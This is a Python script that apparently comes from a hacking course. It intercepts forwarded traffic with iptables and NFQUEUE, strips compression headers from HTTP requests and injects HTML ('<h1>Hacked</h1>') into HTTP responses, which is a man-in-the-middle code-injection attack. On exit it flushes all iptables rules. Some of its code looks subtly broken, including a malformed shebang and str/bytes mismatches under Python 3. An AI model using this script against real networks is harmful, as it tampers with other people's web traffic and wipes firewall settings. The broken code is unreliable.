##!/usr/bin/env python

# Python 3.8
# https://github.com/kti/python-netfilterqueue
# apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev
# pip install -U git+https://github.com/kti/python-netfilterqueue
import re
import subprocess

import netfilterqueue
import scapy.all as scapy


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # convert to scapy packet
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            # HTTP request
            # modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            modified_load = re.sub(r"Accept-Encoding:.*?\r\n", "", scapy_packet[scapy.Raw].load)

            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            # HTTP response
            body = "</body>"
            load_code = "<h1>Hacked</h1>" + body
            modified_load = scapy_packet[scapy.Raw].load.replace(body, load_code)
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))
    packet.accept()


try:
    # traps all packets from FORWARD chain to NFQUEUE
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    print("Setup iptables done")

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("Exiting...")
except Exception:
    print("Something went wrong!")
finally:
    print("Flushing iptables...")
    subprocess.call("iptables --flush", shell=True)
